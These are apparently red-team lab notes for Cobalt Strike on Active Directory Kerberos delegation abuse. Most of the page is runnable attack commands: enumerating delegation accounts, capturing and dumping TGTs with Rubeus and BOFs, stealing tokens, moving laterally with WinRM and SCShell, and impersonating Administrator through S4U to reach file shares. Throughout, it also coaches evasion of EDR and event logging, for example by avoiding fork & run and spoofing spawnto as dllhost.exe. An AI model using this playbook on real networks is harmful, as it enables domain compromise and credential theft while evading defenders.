# C16 - Kerberos

* Unconstrained Delegation
* Constrained Delegation
* Service Name Substitution
* S4u2self Computer Takeover
* Resource-Based Constrained Delegation
* Lateral Movement Services

---

## Unconstrained Delegation

>Enumeration:  

```
ldapsearch (&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288)) --attributes samaccountname
```  

>Rubeus monitor capture TGT:  

```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe monitor /nowrap
```  

>Steel token of user on the compromised attacker machine using Cobalt Strike menu:

>Open Gobalt Strike > Right Click beacon >  Explorer > Process List > Sort processess > click on user token whom to steal > Click Steal Token.  

>Jump to target with unconstrained delegation — preferred order:

```
# OPSEC-SAFE (preferred) — WinRM, no service modification, no disk write
jump winrm64 lon-ws-1 smb

# OPSEC-CAUTION (fallback) — SCShell, modifies existing service ImagePath via SCM
# Generates: Event 7040 (service config changed), 4697, 4688, SCM RPC events
# Use only if WinRM is unavailable or blocked
jump scshell64 lon-ws-1 smb
```

>Now interact with new beacon from the web server.

---

### Fork & Run — Why to Avoid It and What to Use Instead

**What fork & run does:**
CS post-ex commands (`execute-assembly`, `powerpick`, `mimikatz`, etc.) default to spawning a sacrificial child process (`spawnto` binary), injecting a reflective DLL into it, running the payload, then killing the child.

**Why EDR fires on it:**
- Beacon parent (`dllhost.exe`) spawning `rundll32.exe` with no arguments = anomalous parent–child process creation
- Child process memory is `RWX` with no backing disk image = in-memory injection IOC
- EDR hooks `NtCreateProcess`, `VirtualAllocEx`, `CreateRemoteThread` at syscall level — all triggered by fork & run

**Preferred execution model — BOF (`inline-execute`):**
- Runs position-independent C code directly inside the beacon thread
- No child process spawn, no cross-process injection, no `RWX` in another process
- Completely invisible to parent–child process telemetry

| Command | Execution model | Process spawn | EDR risk |
|---------|----------------|---------------|----------|
| `inline-execute` / BOF | In beacon thread | None | Low |
| `krb_triage` / `krb_dump` | BOF | None | Low |
| `execute-assembly` | Fork & run → spawnto | Yes | Medium (mitigated by spawnto) |
| `powerpick` | Fork & run → spawnto | Yes | Medium |
| `shell` / `run` / `powershell` | Spawns cmd/powershell as child | Yes | High — avoid |

**Mitigate fork & run when unavoidable:**
Set `spawnto` in your malleable profile to a plausible signed host process:
```
post-ex { set spawnto_x64 "%windir%\\sysnative\\dllhost.exe"; }
```
Or per-beacon at runtime:
```
spawnto x64 %windir%\sysnative\dllhost.exe
```
This changes *what* is spawned but does not eliminate the injection telemetry — BOF is always preferred.

---

>Get the ticket for user on the web server `dyork` — BOF only, no fork & run:

```
krb_triage

krb_dump /luid:148e2b /service:krbtgt
```

> `OPSEC-CAUTION` — `krb_dump` uses `LsaCallAuthenticationPackage` (Kerberos API). Not a raw LSASS memory read, but EDR hooks on this API will still see the call. BOF means no child process at least.

>Inject ticket directly — no disk write:

```
make_token CONTOSO\dyork FakePass!
kerberos_ticket_use <base64-ticket>
```

> `OPSEC-SAFE` — `kerberos_ticket_use` injects the ticket into the current beacon logon session in-memory. No file written to disk. No child process.

Now we have admin access on the web server by abusing unconstrained delegation on member web server in domain, stealing local admin account and gaining local admin access.  

----

## Safe Remote Command Execution — Avoiding AV/EDR

Use when you need host recon output from a beacon without triggering process-based detections.

### Tier 1 — `OPSEC-SAFE`: BOF (runs in beacon thread, no child process)

```
inline-execute sysinfo.o
```

No `systeminfo.exe` spawned, no child process, runs inside the beacon thread. Preferred when a sysinfo BOF is loaded on the team server.

---

### Tier 2 — `OPSEC-CAUTION`: `powerpick` + WMI (fork & run, no powershell.exe)

Gathers identical data to `systeminfo` without executing the `systeminfo.exe` binary. Fork & run into `spawnto` process — ensure `spawnto` is set to `dllhost.exe` first.

```
powerpick Get-WmiObject Win32_OperatingSystem | Select Caption,Version,OSArchitecture,CSName
powerpick Get-WmiObject Win32_ComputerSystem | Select Domain,TotalPhysicalMemory,Manufacturer,Model
powerpick Get-WmiObject Win32_NetworkAdapterConfiguration -Filter "IPEnabled=True" | Select IPAddress,DefaultIPGateway,DNSServerSearchOrder
```

---

### Tier 3 — `OPSEC-CAUTION`: `run` (direct CreateProcess, no cmd.exe wrapper)

```
run systeminfo
```

Spawns `systeminfo.exe` directly via `CreateProcess` — no `cmd.exe` intermediate. `systeminfo.exe` is a well-known recon binary with behavioural signatures; prefer Tier 1 or 2.

---

### What NOT to Do

```
shell systeminfo      ← OPSEC-UNSAFE: beacon → cmd.exe → systeminfo.exe
powershell systeminfo ← OPSEC-UNSAFE: spawns powershell.exe
```

| Method | Binary spawned | Child process | EDR risk |
|--------|---------------|---------------|----------|
| `inline-execute sysinfo.o` | None | None | Low |
| `powerpick` + WMI | spawnto (`dllhost.exe`) | Yes | Medium |
| `run systeminfo` | `systeminfo.exe` | Yes | Medium-High |
| `shell systeminfo` | `cmd.exe` + `systeminfo.exe` | Yes | High — avoid |

----  

## Constrained Delegation

Constrained delegation restricts which back-end services a principal is permitted to delegate to — unlike unconstrained delegation, the user's TGT is never forwarded. Instead the delegating service uses two Kerberos extensions:

- **S4U2Self** — the service requests a service ticket to *itself* on behalf of any user, without that user's TGT or password
- **S4U2Proxy** — the service uses that ticket to request a service ticket for the configured back-end target (`msDS-AllowedToDelegateTo`)

When the **`TRUSTED_TO_AUTH_FOR_DELEGATION`** flag is set (protocol transition enabled), the service can impersonate *any* user — including Domain Admins — to the delegated service, regardless of whether that user has ever authenticated. This makes it a powerful lateral movement primitive: compromise the delegating machine, obtain its TGT, and you can access the back-end service as Administrator.

---

### Enumeration

Single LDAP query returns the delegating account, its allowed targets, and the UAC flag in one call:

```
ldapsearch (&(samAccountType=805306369)(msDS-AllowedToDelegateTo=*)) --attributes samAccountName,msDS-AllowedToDelegateTo,userAccountControl
```

> `OPSEC-SAFE` — BOF, runs in beacon thread, no child process.

Decode the `userAccountControl` value to confirm `TRUSTED_TO_AUTH_FOR_DELEGATION` is set.  
Run this on the attacker CS client (local PowerShell — not via beacon):

```powershell
# Replace 16781312 with the actual userAccountControl value returned above
[Convert]::ToBoolean(16781312 -band 16777216)
# True = protocol transition enabled
```

⚠️ `16781312` = `WORKSTATION_TRUST_ACCOUNT (0x1000)` + `TRUSTED_TO_AUTH_FOR_DELEGATION (0x1000000)`. If result is `True`, S4U2Self abuse is possible.

---

### Exploitation

#### Step 1 — Move laterally to the delegating host (*lon-ws-1*)

⚠️ steps to [lateral movement - impersonate user](/labs/User-Impersonation-lab.md)

#### Step 2 — Dump the machine TGT via BOF

LUID `0x3e7` is the machine account logon session (always present on domain-joined hosts):

```
krb_dump /luid:3e7 /service:krbtgt
```

> `OPSEC-CAUTION` — BOF (no child process). Uses `LsaCallAuthenticationPackage` Kerberos API — EDR hooks on this call will fire, but no raw LSASS memory read.

#### Step 3 — Perform S4U abuse via BOF to obtain a service ticket

```
krb_s4u /ticket:[base64-TGT] /service:cifs/lon-fs-1 /impersonateuser:Administrator
```

> `OPSEC-SAFE` — `krb_s4u` is a BOF. Runs entirely in the beacon thread. No process spawn, no disk write. Preferred over `execute-assembly Rubeus.exe s4u` which is fork & run.

Optionally inspect the resulting ticket:

```
krb_describe /ticket:[base64-service-ticket]
```

> `OPSEC-SAFE` — BOF, read-only ticket inspection.

#### Step 4 — Inject the service ticket and access the target

All steps on the attacker CS client / beacon — `.kirbi` written to attacker desktop only, never to target disk:

```
make_token CONTOSO\Administrator FakePass!
```

On attacker CS client (local PowerShell):

```powershell
[IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\cifs-lon-fs-1.kirbi", [Convert]::FromBase64String("[B64_SERVICE_TICKET]"))
```

Back in beacon:

```
kerberos_ticket_use C:\Users\Attacker\Desktop\cifs-lon-fs-1.kirbi
ls \\lon-fs-1\c$
```

> `OPSEC-SAFE` — `kerberos_ticket_use` injects in-memory into the beacon's logon session. File path is on the attacker machine, not the target — nothing written to the target's disk.

Drop impersonation when done:

```
rev2self
```

---

### ⚠️ Do Not Use — Fork & Run S4U

```
execute-assembly Rubeus.exe s4u /user:lon-ws-1$ /msdsspn:cifs/lon-fs-1 /ticket:[TGT] /impersonateuser:Administrator /nowrap
```

> `OPSEC-CAUTION` — fork & run, spawns sacrificial `spawnto` process. Use `krb_s4u` BOF instead. Only fall back to this if the BOF is unavailable on the team server.

## 
